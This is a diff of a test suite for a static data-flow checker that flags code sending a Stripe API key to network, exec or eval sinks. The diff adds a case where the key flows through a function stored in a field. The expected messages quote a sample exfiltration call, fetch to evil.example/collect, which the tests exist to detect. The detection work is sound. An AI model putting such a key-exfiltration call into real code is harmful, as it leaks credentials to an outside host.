@@ -23,10 +23,11 @@ describe("data-flow rules", () => {
       "error dumpAll:23 net(logs.example)",
       "error dashboard:44 net(analytics.example)",
       "error viaGetter:56 net(evil.example)",
-      "error viaCallback:65 net(evil.example)",
-      "error viaClient:75 net(evil.example)",
-      "error viaExec:80 exec",
-      "error viaEval:85 unverifiable",
+      "error viaField:65 net(evil.example)",
+      "error viaCallback:74 net(evil.example)",
+      "error viaClient:84 net(evil.example)",
+      "error viaExec:89 exec",
+      "error viaEval:94 unverifiable",
     ]);
   });
 
@@ -39,10 +40,11 @@ describe("data-flow rules", () => {
     expect(message("relay").message).toContain("can send to net (a host that can't be determined)");
   });
 
-  it("follows the source through a getter, a callback, or an object built with it", () => {
+  it("follows the source through a getter, a function in a field, a callback, or an object built with it", () => {
     expect(message("viaGetter").message).toBe(
       "viaGetter gets env(STRIPE_KEY) from stripeKey and can send to net(evil.example), through fetch(\"https://evil.example/collect\", ...), which the flow rule for env(STRIPE_KEY) doesn't allow.",
     );
+    expect(message("viaField").message).toContain("viaField gets env(STRIPE_KEY) from Keys.stripe and can send to net(evil.example)");
     expect(message("viaCallback").message).toMatch(/^viaCallback gets env\(STRIPE_KEY\) from withKey and can send to net\(evil\.example\)/);
     expect(message("viaClient").message).toMatch(/^viaClient gets env\(STRIPE_KEY\) from StripeClient\.constructor and can send/);
   });
@@ -68,13 +70,15 @@ describe("data-flow rules", () => {
     expect(functions).not.toContain("chargeOnly");
     // It calls chargeOnly, which uses the key but returns nothing and takes no callback.
     expect(functions).not.toContain("checkout");
+    // It calls one that returns void or Promise<void>, which can't hand the key back either.
+    expect(functions).not.toContain("refund");
     // It assigns to a setter that uses the key: a setter returns nothing.
     expect(functions).not.toContain("configure");
   });
 
   // Found in review: sketch, which init sets up, turned these into warnings, so a broken rule passed.
   it("fails at every strictness level, sketch included", () => {
-    expect(flows({ strictness: "sketch" }).map((d) => d.severity)).toEqual(Array(9).fill("error"));
+    expect(flows({ strictness: "sketch" }).map((d) => d.severity)).toEqual(Array(10).fill("error"));
   });
 
   it("checks nothing without rules", () => {
